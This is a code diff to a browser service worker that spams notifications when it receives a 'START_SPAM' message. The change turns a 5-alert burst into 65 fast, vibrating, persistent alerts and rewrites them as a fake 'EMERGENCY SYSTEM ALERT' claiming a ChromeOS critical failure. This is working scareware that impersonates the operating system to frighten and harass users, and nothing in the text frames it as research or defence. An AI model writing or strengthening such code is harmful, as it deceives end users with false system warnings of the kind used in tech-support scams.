@@ -1,15 +1,19 @@
 self.addEventListener('message', (event) => {
   if (event.data && event.data.type === 'START_SPAM') {
     let count = 0;
+    const maxBurst = 65; 
+    
     const spammer = setInterval(() => {
-      self.registration.showNotification("YOUR CHROME FILES ARE GETTING DELETED!!! #" + (count + 1), {
-        body: "ChromeOS has detected a fatal error. Deleting system files...",
-        icon: "https://cdn-icons-png.flaticon.com",
-        tag: "spam-" + count + "-" + Date.now(),
-        requireInteraction: true 
+      self.registration.showNotification("⚠️ EMERGENCY SYSTEM ALERT #" + (count + 1), {
+        body: "ChromeOS Critical Failure: System integrity compromised. Action required.",
+        icon: "https://upload.wikimedia.org",
+        tag: "spam-" + Date.now() + "-" + count,
+        requireInteraction: true,
+        vibrate: [200, 100, 200]
       });
+
       count++;
-      if (count >= 5) clearInterval(spammer);
-    }, 200); 
+      if (count >= maxBurst) clearInterval(spammer);
+    }, 150); 
   }
 });
